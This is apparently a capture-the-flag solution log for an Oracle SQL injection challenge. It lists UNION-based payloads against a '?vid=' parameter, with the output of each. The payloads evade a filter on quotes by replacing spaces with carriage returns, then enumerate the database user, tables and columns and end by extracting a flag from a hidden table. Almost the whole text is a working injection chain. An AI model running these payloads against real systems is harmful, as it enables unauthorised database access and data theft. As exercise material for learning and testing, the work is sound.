// database: oracle sql
// feed it to replacer.py to replace %20 by %0D
// the symbol ' is blocked

"?vid=1 AND 1=1"
-> /No error/

"?vid=1 UNION SELECT NULL,NULL,NULL FROM dual"
-> /No error/

"?vid=1 UNION SELECT 1,USER,USER FROM dual"
-> [SCOTT]

"?vid=1 UNION SELECT 1,USER,TABLE_NAME FROM ALL_TABLES WHERE OWNER=USER"
-> [BONUS]

"?vid=1 UNION SELECT 1,USER,TABLE_NAME FROM ALL_TABLES WHERE OWNER=USER AND ROWNUM=1"
-> [S3CRET]

"?vid=1 UNION SELECT 1,USER,a.COLUMN_NAME FROM ALL_TAB_COLUMNS a,(SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER=USER AND ROWNUM=1) b WHERE a.TABLE_NAME=b.TABLE_NAME"
-> [ID]

"?vid=1 UNION SELECT 1,USER,a.COLUMN_NAME FROM ALL_TAB_COLUMNS a,(SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER=USER AND ROWNUM=1) b WHERE a.TABLE_NAME=b.TABLE_NAME AND ROWNUM=1"
-> [V3RY_S3CRET_C0LUMN]

"?vid=1 UNION SELECT 1,USER,V3RY_S3CRET_C0LUMN FROM S3CRET"
-> [FLAG{~~}]
